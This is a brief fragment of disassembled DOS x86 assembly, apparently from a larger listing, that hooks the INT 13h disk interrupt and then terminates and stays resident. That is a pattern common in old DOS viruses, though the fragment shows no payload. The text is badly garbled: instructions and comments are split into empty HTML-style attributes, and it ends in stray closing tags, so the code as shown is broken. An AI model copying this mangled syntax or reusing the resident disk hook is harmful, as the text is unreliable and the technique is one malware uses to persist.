2e891e0803="" mov="" cs:[030ah],es="" ;="l_0975" ;0d38="" 2e8c060a03="" mov="" dx,04ech="" ;="l_0B57" ;0d3d="" baec04="" mov="" ax,2513h="" ;set="" int="" 13h="" vector="" ;0d40="" b81325="" int="" 21h="" ;0d43="" cd21="" mov="" dx,06e9h="" ;="l_0D54" ;0d45="" bae906="" mov="" cl,4="" ;0d48="" b104="" shr="" dx,cl="" ;0d4a="" d3ea="" add="" dx,11h="" ;+256bytes="" (+alignement);0d4c="" 83c211="" mov="" ax,3100h="" ;terminate&stay="" resident;0d4f="" b80031="" int="" 21h="" ;0d52="" cd21="" seg_a="" ends="" end="" start="" =""></-></-></--></-></-></-></->